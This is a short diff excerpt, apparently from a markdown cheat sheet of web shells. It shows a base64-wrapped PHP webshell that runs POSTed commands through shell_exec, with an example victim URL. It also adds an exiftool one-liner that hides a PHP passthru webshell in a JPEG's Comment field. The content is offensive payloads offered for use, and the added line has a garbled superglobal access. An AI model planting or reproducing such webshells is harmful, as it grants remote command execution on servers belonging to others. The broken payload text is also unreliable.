@@ -47,7 +47,18 @@ echo "</pre>";
 ```
 
 Base64 Encoded PHP webshell
+--------------------
 ```php
 <?php $c=shell_exec(base64_decode($_POST['cmd'])); echo base64_encode($c);?>
 #http://victims.site.com/phpwebshell.php?cmd=dir
 ```
+
+Add webshell using EXIF fields
+--------------------
+```bash
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" ./picture.jpg
+```
+
+
+
+
